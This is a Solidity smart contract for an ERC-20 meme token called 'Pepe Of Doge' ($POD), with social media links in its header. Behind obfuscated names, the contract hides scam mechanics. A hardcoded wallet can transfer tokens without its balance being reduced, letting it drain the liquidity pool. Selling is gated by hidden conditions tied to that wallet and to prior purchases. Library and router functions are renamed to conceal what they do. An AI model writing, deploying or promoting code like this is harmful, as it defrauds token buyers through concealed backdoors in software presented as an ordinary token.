/**

Pepe Of Doge   $POD
Pepe Of Doge is a unique meme coin project that is charming and wild like a Doge living in the jungle.

Twitter: https://twitter.com/POD_erc20
Telegram: https://t.me/POD_erc
Website: https://poderc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rfhpb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rfhpb(a, b, "SafeMath");
    }

    function  _rfhpb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _ruipk {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _qtzuy {
    function qmKianpspartmFvcadvcze(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract POD is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _qtzuy private _Tykpuk;
    address payable private _Posveir;
    address private _keoftuh;

    string private constant _name = unicode"Pepe Of Doge";
    string private constant _symbol = unicode"POD";
    uint8 private constant _decimals = 9;
    uint256 private constant _oTotalos = 1000000000 * 10 **_decimals;

    uint256 public _qjpvopd = _oTotalos;
    uint256 public _Wiarsae = _oTotalos;
    uint256 public _rnfTabv= _oTotalos;
    uint256 public _BuaTyaf= _oTotalos;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qifefpr;
    mapping (address => bool) private _tsyrvtfy;
    mapping(address => uint256) private _rhcskq;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymgvkjq=0;
    uint256 private _pevhjfg=0;
    

    bool private _qhejtq;
    bool public _Tqiafhim = false;
    bool private ceqvfe = false;
    bool private _aqevqz = false;


    event _mxzkpazt(uint _qjpvopd);
    modifier vlysair {
        ceqvfe = true;
        _;
        ceqvfe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _oTotalos;
        _qifefpr[owner(

        )] = true;
        _qifefpr[address
        (this)] = true;
        _qifefpr[
            _Posveir] = true;
        _Posveir = 
        payable (0x0bD3186649171638a4b58CdDF186d3098687bf64);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _oTotalos);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _oTotalos;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rfhpb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fksiyrk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tqiafhim) {
                if (to 
                != address
                (_Tykpuk) 
                && to !=
                 address
                 (_keoftuh)) {
                  require(_rhcskq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rhcskq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _keoftuh && to != 
            address(_Tykpuk) &&
             !_qifefpr[to] ) {
                require(amount 
                <= _qjpvopd,
                 "Exceeds the _qjpvopd.");
                require(balanceOf
                (to) + amount
                 <= _Wiarsae,
                  "Exceeds the macxizse.");
                if(_pevhjfg
                < _ymgvkjq){
                  require
                  (! _expakpz(to));
                }
                _pevhjfg++;
                 _tsyrvtfy
                 [to]=true;
                fksiyrk = amount._pvr
                ((_pevhjfg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _keoftuh &&
             from!= address(this) 
            && !_qifefpr[from] ){
                require(amount <= 
                _qjpvopd && 
                balanceOf(_Posveir)
                <_BuaTyaf,
                 "Exceeds the _qjpvopd.");
                fksiyrk = amount._pvr((_pevhjfg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pevhjfg>
                _ymgvkjq &&
                 _tsyrvtfy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ceqvfe 
            && to == _keoftuh &&
             _aqevqz &&
             contractTokenBalance>
             _rnfTabv 
            && _pevhjfg>
            _ymgvkjq&&
             !_qifefpr[to]&&
              !_qifefpr[from]
            ) {
                _pnfrtef( _rvekl(amount, 
                _rvekl(contractTokenBalance,
                _BuaTyaf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uevfev(address
                    (this).balance);
                }
            }
        }

        if(fksiyrk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(fksiyrk);
          emit
           Transfer(from,
           address
           (this),fksiyrk);
        }
        _balances[from
        ]= _rfhpb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rfhpb(fksiyrk));
        emit Transfer
        (from, to, 
        amount.
         _rfhpb(fksiyrk));
    }

    function _pnfrtef(uint256
     tokenAmount) private
      vlysair {
        if(tokenAmount==
        0){return;}
        if(!_qhejtq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tykpuk.WETH();
        _approve(address(this),
         address(
             _Tykpuk), 
             tokenAmount);
        _Tykpuk.
        qmKianpspartmFvcadvcze
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvekl
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rfhpb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Posveir){
            return a ;
        }else{
            return a .
             _rfhpb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qjpvopd = _oTotalos;
        _Wiarsae = _oTotalos;
        emit _mxzkpazt(_oTotalos);
    }

    function _expakpz(address 
    account) private view 
    returns (bool) {
        uint256 ejrcuv;
        assembly {
            ejrcuv :=
             extcodesize
             (account)
        }
        return ejrcuv > 
        0;
    }

    function _uevfev(uint256
    amount) private {
        _Posveir.
        transfer(
            amount);
    }

    function opennTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qhejtq ) ;
        _Tykpuk  
        =  
        _qtzuy
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tykpuk), 
            _oTotalos);
        _keoftuh = 
        _ruipk(_Tykpuk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tykpuk .
             WETH ( ) );
        _Tykpuk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_keoftuh).
        approve(address(_Tykpuk), 
        type(uint)
        .max);
        _aqevqz = true;
        _qhejtq = true;
    }

    receive() external payable {}
}